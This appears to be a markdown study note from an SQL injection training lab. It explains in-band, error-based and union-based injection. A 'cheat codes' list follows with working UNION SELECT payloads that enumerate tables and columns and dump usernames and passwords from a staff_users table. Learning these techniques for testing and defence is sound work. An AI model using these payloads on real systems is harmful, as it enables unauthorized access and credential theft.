# In-Band SQL Injection
- In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.

# Error-Based SQL Injection
- This type of SQL Injection is the most useful for easily obtaining information about the database structure, as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 

# Union-Based SQL Injection
- This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

----
# CHEAT CODES SQL

1) Test for SQL Injection
- '
- "

2) Find number of columns
- 1 UNION SELECT 1
- 1 UNION SELECT 1,2
- 1 UNION SELECT 1,2,3

3) Hide original query output
- 0 UNION SELECT 1,2,3

4) Get database name
- 0 UNION SELECT 1,2,database()

5) List tables in the database
- 0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema='sqli_one'

6. List columns in staff_users table
- 0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name='staff_users'

7.  Dump usernames and passwords
- 0 UNION SELECT 1,2,
group_concat(username,':',password SEPARATOR '<br>')
FROM staff_users


[**Next**](InBandSQLiFlag.md)